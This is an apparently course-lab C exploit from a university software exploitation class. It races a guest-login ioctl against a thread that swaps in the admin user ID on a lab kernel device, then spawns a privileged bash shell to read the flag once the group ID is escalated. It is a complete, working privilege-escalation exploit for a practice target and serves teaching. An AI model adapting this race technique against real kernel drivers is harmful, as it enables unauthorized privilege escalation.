/* -------------------------------------------------
    Kernel-Level Race Condition Exploitation
    lab7-3_exploit.c

    CSC 748
    Software Exploitation
    Dakota State University

    Kiera Conway

	gcc -o 7-3_exploit.bin 7-3_exploit.c -lpthread
  ------------------------------------------------- */

/* Standard Libraries */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

/* File I/O and System Libraries */
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* MultiThreading Library */
#include <pthread.h>

/*  -----------------------------  *
 * |       ** CONSTANTS **       | *
 *  -----------------------------  */
/* Program Settings */
#define DEBUG 0
/*
 * Debug Print Statements
 *      1:  Enable (Print Debug Information)
 *      0:  Disable (Default)
 */

#define MAX_ATTEMPTS -1
/*
 * Set Maximum Number of Exploit Attempts
 *      >0: Set Max Attempts (e.g., 500)
 *      -1: Unlimited (Default, Runs until Successful)
 */


/* Device and Command Settings */
#define DEVFILE		"lab73_login"       // lab 7-3 device file
#define CMD_LOGIN       100             // login command identifier

/* User and Group Settings */
#define LAB73WIN_ID	    1032            // group ID for lab win condition
#define USERID_GUEST	9999            // default user ID for guest login
#define PASSWD_GUEST	123456          // default password for guest login
#define USERID_ADMIN	1337            // user ID for admin


/*  -----------------------------  *
 * |      ** STRUCTURES **       | *
 *  -----------------------------  */
struct login_creds {
    long int userid;
    long int passwd;
};


/*  -----------------------------  *
 * |        ** GLOBALS **        | *
 *  -----------------------------  */
int fd;                                 // device file descriptor
int quit_threads = 0;                   // thread quit signal
struct login_creds login;               // login credentials
pthread_t tRaceExploit, tGuestLogin;    // initialize exploit and login threads


/*  -----------------------------  *
 * | ** MACROS / CONDITIONALS ** | *
 *  -----------------------------  */

#if DEBUG
#define DEBUG_PRINT(fmt, ...) \
    fprintf(stderr, fmt, ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...) do {} while (0)
#endif
/*
 * Debug Print Macro
 *
 * Conditionally enables or disables debug
 * print statements based on the DEBUG flag
 *      DEBUG == 1: prints debug information to stderr
 *      DEBUG == 0: disables debug prints.
 */


/*  -----------  *
 * | FUNCTIONS | *
 *  -----------  */

/*
 * Name -           Guest Login
 *
 * Details -        Simulates a Guest Login Attempt
 *
 * Functionality -  1. Send login command to the device file using ioctl
 *                  2. Check if GID has been elevated to the lab win condition id.
 *                      true:   Signal to quit threads,
 *                              Print a success message,
 *                              and Execute a system command to print flag
 *                      false:  Terminate thread
 *
 * Parameters -     *arg:   Unused parameter (required for thread function signature)
 *
 * Returns -        None
 *
 * Notes -          1. Relies on global variables: fd, CMD_LOGIN, LAB73WIN_ID,
 *                     quit_threads, and login.
 *                  2. Debug prints are conditionally enabled based on DEBUG flag.
 *                  3. May modify the quit_threads variable and escalate privileges
 *                     under certain conditions.
 *                  4. Executes a command with execl system call
 */
void *GuestLogin(void *arg) {
    /* Retrieve Thread ID */
    pthread_t id = pthread_self();
    DEBUG_PRINT("[thread %ld] GuestLogin() Enter: GID <%d>\n", id, getegid());

    /* Send Login Command to Device File */
    ioctl(fd, CMD_LOGIN, &login);
    DEBUG_PRINT("[thread %ld] GuestLogin() ioctl Return: GID <%d>\n", id, getegid());

    /* Check for Privilege Escalation */
    if (getegid() == LAB73WIN_ID){

        /* Signal to Quit Threads */
        quit_threads = 1;

        /* Inform User */
        printf("[*] Privileges Successfully Escalated: GID <%d>\n", getegid());
        sleep(1);
        printf("[*] Printing Flag\n");

        /* Execute System Command to Print Flag */

        /*
         * /bin/bash -p -c "cat /home/lab7-3/flag.txt"
         *
         *      /bin/bash:      Path to Bash Shell Executable
         *      -p:             Runs Shell in Privileged mode
         *      -c:             Specifies Command to be Executed
         *
         *      "cat /home/lab7-3/flag.txt":    Display Contents of Flag File
         *
         */

        execl("/bin/bash",
              "/bin/bash", "-p", "-c", "cat /home/lab7-3/flag.txt", NULL);

        perror("execl failed");  // only reached if execl fails
    }

    /* Terminate Thread */
    pthread_exit(NULL);
}


/*
 * Name -           Exploit Race Condition
 *
 * Details -        Attempt to Exploit a Race Condition
 *
 * Functionality -  1. Update login username credentials to the admin user ID
 *                  2. Send ioctl command to Device File
 *                      (This is the Potential Race Condition Exploit)
 *                  3. Terminate Thread
 *
 * Parameters -     *arg:   Unused parameter (required for thread function signature)
 *
 * Returns -        None
 *
 * Notes -          1. Relies on global variables: fd, USERID_ADMIN, and login.
 *                  2. Debug prints are conditionally enabled based on DEBUG flag.
 *                  3. May modify the login variable and perform a race condition
 *                     exploit.
 */
void *ExploitRaceCondition(void *arg) {
    /* Retrieve Thread ID */
    pthread_t id = pthread_self();
    DEBUG_PRINT("[thread %ld] ExploitRaceCondition() Enter: GID <%d>\n",
                id, getegid());

    /* Update Login Username Credentials */
    login.userid = USERID_ADMIN;

    /* Send Command to Device File */
    ioctl(fd, 200, &login);
    DEBUG_PRINT("[thread %ld] ExploitRaceCondition() ioctl Return: GID <%d>\n",
                id, getegid());

    /* Terminate Thread */
    pthread_exit(NULL);
}

/*
 * Name -           main
 *
 * Details -        Program Entry Point
 *
 * Functionality -  1. Print Program Settings (Debug Status and Maximum Attempts)
 *                  2. Attempt to exploit race condition
 *                      - Open device file and
 *                      - Initialize login credentials as guest
 *                      - Create thread to simulate a guest login attempt
 *                      - Create thread to attempt to exploit a race condition
 *                      - Wait for created threads to terminate
 *                      - Close device file and increment attempt counter
 *                      * Attempt loop repeats until privileges are escalated or
 *                        maximum attempts are reached *
 *                  - - successful exploit does not proceed past this point --
 *                  3. Check for privilege escalation failure
 *                  4. Print result message
 *
 * Parameters -     argc:   Number of command-line arguments
 *                  argv:   Array of command-line argument strings
 *
 * Returns -        0:      Successful Execution
 *
 * Notes -          1. Debug prints are conditionally enabled based on DEBUG flag.
 *                  2. Spawn threading for concurrent execution
 *                  3. Communicates with kernel through the device file (/dev/lab73_login)
 */
int main(int argc, char *argv[]) {

    /*
     * Print Program Settings
     */

    /* Debug Print Settings */
    printf("[!] DEBUG SETTINGS: %s\n", DEBUG ? "ENABLED" : "DISABLED");
    sleep(1);

    /* Max Attempts Settings */
    if (MAX_ATTEMPTS == -1) {
        printf("[!] MAX ATTEMPTS: UNLIMITED\n\n");
    }
    else {
        printf("[!] MAX ATTEMPTS: %d\n\n", MAX_ATTEMPTS);
    }
    sleep(1);

    /* Inform of Program Start */
    printf("[*] Program Starting ...\n\n");
    sleep(1);


    /*
     * Attempt to Exploit Race Condition
     */

    /* Initialize Attempt Counter */
    int attempts = 1;

    /* Loop Until Privileges Escalated or Maximum Attempts Reached */
    while (!quit_threads && (MAX_ATTEMPTS == -1 || attempts < MAX_ATTEMPTS)){

        /* Open Device File */
        DEBUG_PRINT("[attempts=%d] Open Device File: GID <%d>\n", 
                    attempts, getegid());
        fd = open("/dev/"DEVFILE, O_RDWR);
        if (fd < 0) {
            perror("[X] Device File Open Error");
            return 0;
        }

        /* Initialize Login Credentials as Guest */
        login.userid = USERID_GUEST;
        login.passwd = PASSWD_GUEST;

        /* Thread Creation */
        // Create Thread to Simulate a Guest Login Attempt //
        DEBUG_PRINT("[attempts=%d] Starting Thread tGuestLogin: GID <%d>\n", 
                    attempts, getegid());
        pthread_create(&tGuestLogin, 
                       NULL, 
                       GuestLogin, 
                       NULL);

        // Create Thread to Attempt to Exploit a Race Condition //
        DEBUG_PRINT("[attempts=%d] Starting Thread tRaceExploit: GID <%d>\n", 
                    attempts, getegid());
        pthread_create(&tRaceExploit, 
                       NULL, 
                       ExploitRaceCondition, 
                       NULL);


        /* Thread Termination */
        pthread_join(tRaceExploit, NULL);
        pthread_join(tGuestLogin, NULL);
        DEBUG_PRINT("[attempts=%d] Threads Joined: GID <%d>\n", 
                    attempts, getegid());

        /* Conclude Attempt */
        close(fd); // close device file
        attempts++;         // increment attempt counter
    }

    /*
     * Program Termination
     */

    /* Privilege Escalation Failure (within Attempt Limit) */
    if (!quit_threads) {
        printf("[*] Privilege Escalation Failed within Attempt Limit (%d).\n", MAX_ATTEMPTS);
        printf("[*] Please Retry or Raise Maximum Attempts.\n\n");
    }

    /* Print Result Message */
    DEBUG_PRINT("[*] Program End: GID <%d>\n", getegid());
    return 0;
}
